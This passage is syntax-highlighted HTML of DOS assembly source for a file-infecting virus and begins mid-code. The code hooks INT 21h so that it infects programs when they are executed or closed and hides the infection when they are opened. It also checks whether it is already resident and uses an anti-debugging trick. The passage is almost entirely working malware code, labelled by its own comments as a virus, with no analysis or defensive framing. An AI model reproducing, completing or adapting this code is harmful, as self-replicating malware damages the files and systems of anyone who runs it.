                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc4">*</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">BDA_DriveNumber</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.DCB_DeviceAtribs</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'A'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">program_name</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">             </span><span class="sc1">;get current directory</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">fail_close_clc</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">di.DCB_FileName</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc13">'\' ; al=0
</span><span class="sc0">                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'\' ; al='</span><span class="sc0">\</span><span class="sc13">'
</span><span class="sc0">                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">DCB_FileName</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
     </span><span class="sc5">copy_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;atach file name to path</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">loopnz</span><span class="sc0">  </span><span class="sc5">copy_name</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">DCB_FileExt</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,-</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">DCB_FileName</span><span class="sc0">
      </span><span class="sc5">copy_ext</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;atach file extension to file name</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">loopnz</span><span class="sc0">  </span><span class="sc5">copy_ext</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">program_name</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">common_infect</span><span class="sc0">   </span><span class="sc1">;infect the file</span><span class="sc0">
</span><span class="sc5">fail_close_clc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc5">fail_close</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

      </span><span class="sc5">on_close</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_on_close</span><span class="sc0">

</span><span class="sc5">self_check</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_int_21</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">jmp_int_21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;copy old int 21h</span><span class="sc0">
                </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">go_iret</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">new_int_21</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cli</span><span class="sc0">                     </span><span class="sc1">;new INT 21h service routine</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;antitrace.. dont fuck with me</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_iret</span><span class="sc0">
        </span><span class="sc5">chk_3E</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">          </span><span class="sc1">;close?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">on_close</span><span class="sc0">
        </span><span class="sc5">chk_30</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30AFh</span><span class="sc0">        </span><span class="sc1">;are we already installed?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">self_check</span><span class="sc0">
        </span><span class="sc5">chk_4B</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">          </span><span class="sc1">;execute?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">chk_3D</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">common_infect</span><span class="sc0">
        </span><span class="sc5">chk_3D</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">          </span><span class="sc1">;open?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">jmp_int_21</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">common_clean</span><span class="sc0">

</span><span class="sc5">jmp_int_21</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">            </span><span class="sc1">;JMP SEG:OFF opcode</span><span class="sc0">
</span><span class="sc5">v_end</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;virus end on filez</span><span class="sc0">
</span><span class="sc5">old_int_21</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;old INT 21h vector</span><span class="sc0">

</span><span class="sc5">program_name</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;buffer to hold program namez</span><span class="sc0">
</span><span class="sc5">flag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;used to prevent circular execution</span><span class="sc0">
</span><span class="sc5">b_start</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;start of internal buffer</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">v_start</span><span class="sc0">
</span></div></body>
</html>
